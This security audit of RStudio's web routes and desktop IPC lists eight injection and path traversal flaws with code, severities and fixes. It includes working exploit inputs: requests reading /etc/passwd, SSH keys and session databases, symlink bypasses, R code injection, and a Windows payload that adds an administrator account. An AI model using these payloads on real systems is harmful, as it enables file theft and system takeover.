# Security Audit: Injection Vulnerabilities in GET Routes
**Repository:** RStudio (Posit)
**Audit Date:** 2026-02-26
**Auditor:** Senior Security Code Auditor
**Scope:** GET route handlers, query parameters, path parameters — injection vulnerability surface

---

## 1. GET Endpoint Enumeration

All URI handlers are registered via `registerUriHandler()` / `registerAsyncUriHandler()` in session module `initialize()` functions. The following GET-accessible endpoints were identified:

| Endpoint | Handler Function | Source File |
|---|---|---|
| `/content` | `handleContentRequest()` | `session/SessionContentUrls.cpp:147` |
| `/show/*` | `handleShowRequest()` | `session/modules/SessionFiles.cpp:625` |
| `/file_show` | `handleFileShow()` | `session/modules/SessionWorkbench.cpp:438` |
| `/presentation/*` | `handlePresentationRequest()` | `session/modules/presentation/SlideRequestHandler.cpp` |
| `/html_preview/*` | `handleHTMLPreviewRequest()` | `session/modules/SessionHTMLPreview.cpp` |
| `/tutorial/run` | `handleTutorialRunRequest()` | `session/modules/SessionTutorial.cpp:171` |
| `/themes/default/*` | `handleDefaultThemeRequest()` | `session/modules/SessionThemes.cpp:582` |
| `/themes/custom/global/*` | `handleGlobalCustomThemeRequest()` | `session/modules/SessionThemes.cpp:596` |
| `/themes/custom/local/*` | `handleLocalCustomThemeRequest()` | `session/modules/SessionThemes.cpp:616` |
| `/view_pdf` | `handleViewPdf()` | `session/modules/tex/SessionViewPdf.cpp:38` |
| `/help/dev-figure` | `handleDevFigure()` | `session/modules/SessionHelp.cpp:776` |
| JSON-RPC `get_script_run_command` | `getScriptRunCommand()` | `session/modules/SessionSource.cpp:1555` |
| Electron IPC `desktop_install_rtools` | anonymous IPC handler | `src/node/desktop/src/main/gwt-callback.ts:975` |

---

## 2. Vulnerability Findings

---

### VULN-01 — Path Traversal: `/content` Endpoint (CRITICAL)

**Endpoint:** `GET /content?title=<x>&file=<attacker>`
**Parameter:** `file` (query string)
**Source:** `SessionContentUrls.cpp:99`
**Sink:** `SessionContentUrls.cpp:102`
**Type:** Path Traversal → Arbitrary File Read

#### Code Path

```
// SessionContentUrls.cpp:69
Error contentFileInfo(const std::string& contentUrl, ...)
{
    ...
    // Line 99 — file parameter extracted from query string, NO validation:
    std::string contentFile = http::util::fieldValue(fields, "file");
    if (contentFile.empty())
        return systemError(ENOENT, ERROR_LOCATION);

    // Line 102 — completePath() does NOT check containment (no isWithin() call):
    *pFilePath = contentUrlPath().completePath(contentFile);
    //           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //           contentUrlPath() = userScratchPath()/content_urls/
    //           completePath()   = boost::filesystem::complete() — lexical join, no guard
}

// Line 147 — file is read and returned in response body:
void handleContentRequest(const http::Request& request, http::Response* pResponse)
{
    ...
    Error error = core::readStringFromFile(contentFilePath, &contents);
    pResponse->setBody(contents);
}
```

#### Key Distinction — `completePath()` vs `completeChildPath()`

- **`completePath()`** (`FilePath.cpp:785`): calls `boost::filesystem::complete()` — simple join, **no `isWithin()` guard**.
- **`completeChildPath()`** (`FilePath.cpp:739`): calls `completePath()` **then** `isWithin(*this)` — throws if child escapes parent.

`/content` uses the **unsafe** variant.

#### Exploit

Assuming `contentUrlPath()` = `/home/rstudio-user/.local/share/rstudio/content_urls/` (6 path components after root):

```
GET /content?title=x&file=../../../../../../etc/passwd

Resolves:
  /home/rstudio-user/.local/share/rstudio/content_urls/../../../../../../etc/passwd
  => /etc/passwd
```

Response body contains `/etc/passwd` contents.

**Read SSH private key:**
```
GET /content?title=x&file=../../../.ssh/id_rsa
```

**Read RStudio database with session tokens:**
```
GET /content?title=x&file=../../db/rstudio.sqlite
```

#### Impact

Authenticated session → arbitrary file read as the RStudio server process user. In multi-user deployments, each user is isolated by a per-user `rsession` process. The read is limited to files accessible by *that user's* process. An RStudio Server admin running as root would be able to read any system file.

---

### VULN-02 — Symlink-Based Path Traversal: Theme Endpoints (HIGH)

**Endpoints:**
- `GET /themes/default/<path>`
- `GET /themes/custom/global/<path>`
- `GET /themes/custom/local/<path>`

**Parameter:** URI path component (after prefix)
**Source:** `SessionThemes.cpp:586, 602, 622`
**Sink:** `SessionThemes.cpp:587, 603, 624` via `completeChildPath()` → `setCacheableFile()`
**Type:** Symlink Race / Path Traversal Bypass

#### Code Path

```cpp
// SessionThemes.cpp:582
void handleDefaultThemeRequest(const http::Request& request, http::Response* pResponse)
{
    std::string prefix = "/" + kDefaultThemeLocation;
    std::string fileName = http::util::pathAfterPrefix(request, prefix);
    // completeChildPath() calls isWithin() — but isWithin() uses lexically_normal()
    setCacheableFile(getDefaultThemePath().completeChildPath(fileName), request, pResponse);
}
```

```cpp
// FilePath.cpp:1406
bool FilePath::isWithin(const FilePath& in_scopePath) const
{
    // Uses getLexicallyNormalPath() — string/lexical normalization only
    FilePath child(getLexicallyNormalPath());
    FilePath parent(in_scopePath.getLexicallyNormalPath());
    // Compares path components lexically — does NOT call realpath()/canonical()
    ...
}
```

#### Why `lexically_normal()` Is Insufficient

`lexically_normal()` collapses `..` in the path string. It **does not resolve symlinks**. The OS `open()` syscall will follow symlinks after the check has already passed.

#### Exploit

**Pre-condition:** Attacker has write access to the custom theme directory (which they do, since users can install themes via the UI into their user theme directory). Local theme directory ≈ `~/.config/rstudio/themes/`.

1. Create symlink inside the allowed theme directory:
   ```bash
   ln -s /etc /home/user/.config/rstudio/themes/escape_link
   ```

2. Request the symlinked path:
   ```
   GET /themes/custom/local/escape_link/passwd
   ```

3. `completeChildPath("escape_link/passwd")`:
   - Lexically normalized path = `~/.config/rstudio/themes/escape_link/passwd`
   - `isWithin()` check: `escape_link/passwd` is lexically inside the theme dir — **check passes**
   - `setCacheableFile()` opens the file → OS follows symlink → reads `/etc/passwd`

#### Impact

Authenticated user reads files outside their theme directory, up to any file their OS user can read.

---

### VULN-03 — Path Traversal: `/show/` Endpoint (HIGH)

**Endpoint:** `GET /show/<path>`
**Parameter:** URI path (after `/show` prefix), URL-decoded
**Source:** `SessionFiles.cpp:629-637`
**Sink:** `SessionFiles.cpp:659` — `pResponse->setFile(filePath, request)`
**Type:** Path Traversal (mitigated in server mode by `isPathViewAllowed()`; unmitigated in desktop mode)

#### Code Path

```cpp
// SessionFiles.cpp:625
void handleShowRequest(const http::Request& request, http::Response* pResponse)
{
    std::string uri = request.uri();

    // Strip query string
    std::size_t pos = uri.find("?");
    if (pos != std::string::npos)
        uri.erase(pos);

    // Line 637 — raw URI path used to construct FilePath, only URL-decoded:
    FilePath filePath(http::util::urlDecode(uri.substr(strlen("/show"))));

    // Mitigation: isPathViewAllowed() — but:
    //   1. In desktop mode: always returns true (line 2652 in SessionModuleContext.cpp)
    //   2. In server mode: uses isWithin() with lexically_normal() — symlink bypass applies
    if (!module_context::isPathViewAllowed(filePath))
    {
        pResponse->setNotFoundError(request);
        return;
    }

    pResponse->setNoCacheHeaders();
    pResponse->setFile(filePath, request);
}
```

```cpp
// SessionModuleContext.cpp:2645
bool isPathViewAllowed(const FilePath& filePath)
{
    // No restrictions in desktop mode:
    if (options().programMode() != kSessionProgramModeServer)
        return true;   // ← DESKTOP: no guard at all

    // Server mode: checks isWithin() which uses lexical normalization — symlink bypass
    if (filePath.isWithin(userHomePath().getParent()))
        return true;
    ...
}
```

#### Exploit (Desktop Mode)

```
GET /show//etc/passwd
GET /show/../../../etc/shadow
```

In desktop mode, the file path is directly constructed from the URI with no containment check. Any absolute path or traversal path resolves freely.

#### Exploit (Server Mode — Symlink Bypass)

Same symlink technique as VULN-02:
1. Create `/home/user/escape -> /etc`
2. `GET /show/home/user/escape/passwd`
3. `isPathViewAllowed()` → `isWithin(userHomePath().getParent())` → lexically `home/user/escape` is within `/home` → check passes → file opened → symlink followed → `/etc/passwd` read

#### Impact

Desktop: unrestricted local file read. Server: symlink-gated bypass to read files outside home directory.

---

### VULN-04 — Path Traversal: `/html_preview/` and `/presentation/` (HIGH)

**Endpoints:**
- `GET /html_preview/<path>`
- `GET /presentation/<path>`

**Parameter:** URI path component (after prefix)
**Source:**
- `SessionHTMLPreview.cpp:964-972`
- `SlideRequestHandler.cpp:1160-1169`

**Sink:** `pResponse->setFile(filePath, request)` in both
**Type:** Path Traversal — containment check uses `completeChildPath()` but symlink bypass applies

#### Code — HTML Preview

```cpp
// SessionHTMLPreview.cpp:960
else if (boost::algorithm::starts_with(path, "mathjax-27"))
{
    FilePath filePath =
        session::options().mathjaxPath().getParent().completeChildPath(path);
    //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //  mathjaxPath().getParent() is the parent of the mathjax-27 dir.
    //  path starts with "mathjax-27" — but completeChildPath's isWithin()
    //  check is lexical only: symlink inside mathjaxPath().getParent() escapes.
    pResponse->setFile(filePath, request);
}

else  // dependent file
{
    FilePath filePath = s_pCurrentPreview_->targetDirectory().completeChildPath(path);
    //  targetDirectory() is controlled by session state, set when preview is launched.
    //  If attacker can influence targetDirectory (e.g., via crafted Rmd file),
    //  or if symlink bypass applies, arbitrary file can be reached.
    pResponse->setFile(filePath, request);
}
```

#### Code — Presentation (Unguarded Fallback)

```cpp
// SlideRequestHandler.cpp:1166
else  // no prefix matched
{
    FilePath targetFile = presentation::state::directory().completeChildPath(path);
    // completeChildPath() used — lexical isWithin() guard.
    // Symlink bypass: create symlink inside presentation directory.
    pResponse->addHeader("Accept-Ranges", "bytes");
    setWebCacheableFileResponse(targetFile, request, pResponse);
}
```

#### Exploit (MathJax prefix bypass attempt)

`completeChildPath()` prevents `mathjax-27/../../../` purely lexically but symlinks inside the MathJax parent directory escape the check:

```bash
# Attacker controls a file in the MathJax parent (unlikely in server, but note it)
ln -s /etc /opt/rstudio/resources/mathjax-27-parent/escape

GET /html_preview/mathjax-27/../escape/passwd
# lexically: stays in parent via normalization before isWithin() check
# but if the symlink is at the parent level:
GET /html_preview/escape/passwd   (after creating escape → /etc)
```

#### Impact

Files readable by the RStudio process that are symlink-reachable from the MathJax or presentation directories can be exfiltrated.

---

### VULN-05 — Parameter Injection into R: `/tutorial/run` (MEDIUM)

**Endpoint:** `GET /tutorial/run?package=<x>&name=<y>`
**Parameters:** `package`, `name` (query string)
**Source:** `SessionTutorial.cpp:174-175`
**Sink:** `SessionTutorial.cpp:177-180` — `r::exec::RFunction(".rs.tutorial.runTutorial").addParam(name).addParam(package).call()`
**Type:** R Parameter Injection

#### Code Path

```cpp
// SessionTutorial.cpp:171
void handleTutorialRunRequest(const http::Request& request, http::Response* pResponse)
{
    std::string package = request.queryParamValue("package");
    std::string name = request.queryParamValue("name");

    // Both parameters passed as R character strings — no validation
    Error error = r::exec::RFunction(".rs.tutorial.runTutorial")
          .addParam(name)      // ← raw user input
          .addParam(package)   // ← raw user input
          .call();
    ...
}
```

#### Behavior Analysis

`addParam()` passes values as typed R character vectors (not as raw R code), so direct R code injection through this call is unlikely. However, if `.rs.tutorial.runTutorial` uses `package` in a `library()` call or passes it to `system()` internally without validation, secondary injection is possible.

#### Exploit Attempt

```
GET /tutorial/run?package=../../../../malicious&name=test
```

Depending on how the R function uses `package` to locate tutorial files, path traversal into R's `find.package()` or `system.file()` may occur.

**No whitelist on package name** — any package name is accepted and forwarded to R.

#### Impact

Medium — exploitability depends on R-side implementation. Recommend treating as confirmed until `.rs.tutorial.runTutorial` is verified to be safe.

---

### VULN-06 — R Code Injection via RMarkdown `renderFunc` (MEDIUM)

**Trigger:** Rendering a crafted `.Rmd` / `.qmd` file
**Parameter:** `knit:` field in YAML front matter (file-controlled, not direct HTTP param)
**Source:** `SessionRMarkdown.R:154` → `SessionRMarkdown.cpp:536-539`
**Sink:** `SessionRMarkdown.cpp:622-623` — embedded into R code string without escaping
**Type:** R Code Injection via Unsanitized String Interpolation

#### Code Path

```r
# SessionRMarkdown.R:154 — reads knit: field from YAML front matter
.rs.addFunction("getCustomRenderFunction", function(file) {
    lines <- readLines(file, warn = FALSE)
    yamlFrontMatter <- rmarkdown:::parse_yaml_front_matter(lines)
    if (is.character(yamlFrontMatter[["knit"]]))
        yamlFrontMatter[["knit"]][[1]]   # ← returned as renderFunc
    ...
})
```

```cpp
// SessionRMarkdown.cpp:619-623
error = r::exec::evaluateString(renderFunc, &renderFuncSEXP, &rProtect);
if (error || !r::sexp::isFunction((renderFuncSEXP)))
{
    // renderFunc is NOT a valid R function — fall back to system() wrapper
    // renderFunc is embedded directly with %1% — NO single-quote escaping applied here
    boost::format fmt("(function(input, ...) { invisible(system(paste0('%1% \"', input, '\" ', '%2%'))) })");
    renderFunc = boost::str(fmt % renderFunc % extraArgs);
    //                             ^^^^^^^^^
    //                             Unescaped — single quotes in renderFunc break out of paste0()
}
```

Note: `singleQuotedStrEscape()` is applied to `targetFile` (line 631) but **not** to `renderFunc`.

#### Exploit

Create `.Rmd` with crafted `knit:` field:

```yaml
---
title: "Exploit"
knit: "system('id > /tmp/pwned'); knitr::knit"
---
```

1. `getCustomRenderFunction()` returns `system('id > /tmp/pwned'); knitr::knit`
2. `evaluateString()` — this is a valid expression (not a bare function), so it may fail the `isFunction()` check depending on evaluation
3. If `!isFunction`, the fallback embeds it into:
   ```r
   (function(input, ...) { invisible(system(paste0('system('id > /tmp/pwned'); knitr::knit "', input, ...))) })
   ```
   The embedded single quote breaks the `paste0()` call, injecting arbitrary R code.

#### Impact

A user who opens/renders a maliciously crafted Rmd file triggers execution of arbitrary R code as themselves. In a collaborative or shared environment (e.g., a shared project), this is a meaningful escalation path.

---

### VULN-07 — Command Injection: `getScriptRunCommand` JSON-RPC (MEDIUM)

**Endpoint:** JSON-RPC method `get_script_run_command`
**Parameter:** `interpreter` (JSON-RPC params[0])
**Source:** `SessionSource.cpp:1560`
**Sink:** `SessionSource.cpp:1605-1606`
**Type:** R Code / Shell Command Injection

#### Code Path

```cpp
// SessionSource.cpp:1555
Error getScriptRunCommand(const json::JsonRpcRequest& request,
                          json::JsonRpcResponse* pResponse)
{
    std::string interpreter, path;
    Error error = json::readParams(request.params, &interpreter, &path);

    // ... path handling ...

    // Line 1601-1606: interpreter is concatenated WITHOUT escaping
    std::string command;
    if (interpreter.empty())
        command = path;
    else
        command = interpreter + " " + path;          // ← raw interpreter

    command = "system(\"" + command + "\")";
    //         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //         Injects into R code string — double-quote in interpreter breaks out

    pResponse->setResult(command);  // returned to client; client runs it in R console
    return Success();
}
```

#### Exploit

An authenticated user injects into the returned R expression. If the frontend evaluates this directly (e.g., auto-runs a "Run Script" command):

```json
{ "method": "get_script_run_command", "params": ["\"); system(\"id\"); x <- (\"", "/path/to/script"] }
```

Resulting `command`:
```r
system(""); system("id"); x <- (" /path/to/script")
```

When the client evaluates this in the R console, the injected `system("id")` executes.

#### Impact

Since the returned command is evaluated by the same user's R session, this does not constitute privilege escalation by itself. However, if the result is auto-evaluated (not shown to the user before execution), this is meaningful. In any case the unescaped construction is a latent defect.

---

### VULN-08 — Command Injection: Electron IPC `desktop_install_rtools` (HIGH, Windows only)

**Platform:** Windows desktop only
**Trigger:** Electron IPC message `desktop_install_rtools`
**Parameters:** `version`, `installerPath` (Electron IPC args)
**Source:** `gwt-callback.ts:975`
**Sink:** `gwt-callback.ts:983` — `exec(command, ...)`
**Type:** OS Command Injection

#### Code Path

```typescript
// gwt-callback.ts:975
ipcMain.on('desktop_install_rtools', (_event, version, installerPath) => {
    let command = `${installerPath} /SP- /SILENT`;
    //             ^^^^^^^^^^^^^^^^
    //             Raw string interpolation — no quoting, no escaping

    const systemDrive = process.env.SYSTEMDRIVE;
    if (systemDrive?.length && existsSync(systemDrive)) {
        command = `${command} /DIR=${systemDrive}\\RBuildTools\\${version}`;
        //                                                        ^^^^^^^^^
        //                                                        version also unescaped
    }

    exec(command, (error, _stdout, stderr) => {    // ← shell=true via exec()
        if (error) { logger().logError(stderr); }
    });
});
```

`child_process.exec()` invokes the OS shell (`cmd.exe` on Windows). The full string is passed to the shell, so any shell metacharacters in `installerPath` or `version` are interpreted.

#### Exploit

**Pre-condition:** Attacker achieves XSS in the renderer process (e.g., via a crafted help page, Rmd output, or HTML viewer content) AND the renderer has access to `ipcRenderer` (requires `nodeIntegration: true` or an exposed preload API).

From renderer XSS:
```javascript
const { ipcRenderer } = require('electron');
ipcRenderer.send('desktop_install_rtools',
    '1.0',
    'cmd /c "net user hacker P@ss /add && net localgroup Administrators hacker /add" & dummy'
);
```

Resulting `command`:
```
cmd /c "net user hacker P@ss /add && net localgroup Administrators hacker /add" & dummy /SP- /SILENT
```

`exec()` passes this to `cmd.exe` → arbitrary commands run in the main process.

#### Impact

On Windows, if renderer is compromised (XSS) and `nodeIntegration` is enabled or preload exposes IPC: **arbitrary OS command execution as the desktop user**. RStudio desktop runs as the logged-in user; if that user is an admin, this is full system compromise.

---

## 3. Finding Summary Table

| ID | Endpoint | Parameter | Source Location | Sink Location | Type | Severity |
|---|---|---|---|---|---|---|
| VULN-01 | `GET /content` | `file` (query) | `SessionContentUrls.cpp:99` | `SessionContentUrls.cpp:102` | Path Traversal — no containment check | **CRITICAL** |
| VULN-02 | `GET /themes/custom/local/*` | URI path | `SessionThemes.cpp:622` | `SessionThemes.cpp:624` | Path Traversal — symlink bypass `isWithin()` | **HIGH** |
| VULN-03 | `GET /show/*` | URI path | `SessionFiles.cpp:637` | `SessionFiles.cpp:659` | Path Traversal — no guard (desktop); symlink bypass (server) | **HIGH** |
| VULN-04 | `GET /html_preview/*`, `GET /presentation/*` | URI path | `SessionHTMLPreview.cpp:964`, `SlideRequestHandler.cpp:1160` | `setFile()` calls | Path Traversal — symlink bypass | **HIGH** |
| VULN-05 | `GET /tutorial/run` | `package`, `name` (query) | `SessionTutorial.cpp:174-175` | `SessionTutorial.cpp:177` | R Parameter Injection — no whitelist | **MEDIUM** |
| VULN-06 | Rmd Render | `knit:` YAML field | `SessionRMarkdown.R:170` | `SessionRMarkdown.cpp:622` | R Code Injection — unescaped string interpolation | **MEDIUM** |
| VULN-07 | JSON-RPC `get_script_run_command` | `interpreter` | `SessionSource.cpp:1560` | `SessionSource.cpp:1606` | R Code Injection — unescaped concat into `system()` | **MEDIUM** |
| VULN-08 | Electron IPC `desktop_install_rtools` | `version`, `installerPath` | `gwt-callback.ts:975` | `gwt-callback.ts:983` | OS Command Injection via `exec()` | **HIGH (Windows)** |

---

## 4. Filtering Analysis — What Exists and How to Bypass

### `isPathViewAllowed()` (`SessionModuleContext.cpp:2645`)

**What it does:**
- Desktop mode: always returns `true` (no restriction)
- Server mode: checks `isWithin()` for home dir, temp path, R library dirs, system config, allow-list

**Bypass — Symlink:** `isWithin()` calls `getLexicallyNormalPath()` which calls `lexically_normal()` — a **string operation** (Boost FS path normalization). It does **not** call `realpath()` or `boost::filesystem::canonical()`. Therefore a symlink inside any allowed directory pointing outside it will pass the check, because the symlink's *lexical* path is still inside the allowed tree.

### `completeChildPath()` (`FilePath.cpp:739`)

**What it does:** Calls `completePath()` then `isWithin(*this)`.

**Bypass — Same symlink issue** as above: `isWithin()` is lexical only.

### `completePath()` (`FilePath.cpp:785`)

**What it does:** Calls `boost::filesystem::complete()` — simple path join with no containment check.

**No bypass needed** — there is no guard to bypass on `/content`.

---

## 5. Recommendations

| Priority | Fix |
|---|---|
| P0 | **VULN-01**: Replace `completePath()` with `completeChildPath()` in `contentFileInfo()`. |
| P0 | **VULN-03**: In `handleShowRequest()`, add explicit path containment check using `realpath()`-based canonicalization, not just lexical `isWithin()`. |
| P1 | **VULN-02/03/04**: Update `isWithin()` to use `boost::filesystem::weakly_canonical()` or POSIX `realpath()` before comparing paths, to eliminate symlink bypass. |
| P1 | **VULN-08**: Replace `exec(command_string)` with `spawn(binary, [args])` using an argument array to prevent shell interpretation. |
| P2 | **VULN-06**: Apply `singleQuotedStrEscape()` (or equivalent) to `renderFunc` before embedding in `boost::format` at `SessionRMarkdown.cpp:622`. |
| P2 | **VULN-07**: In `getScriptRunCommand()`, escape `interpreter` and `path` for embedding inside a double-quoted R string, or refuse characters that break out of the string context. |
| P3 | **VULN-05**: Validate `package` parameter against installed package names using `find.packages()` before passing to `.rs.tutorial.runTutorial`. |
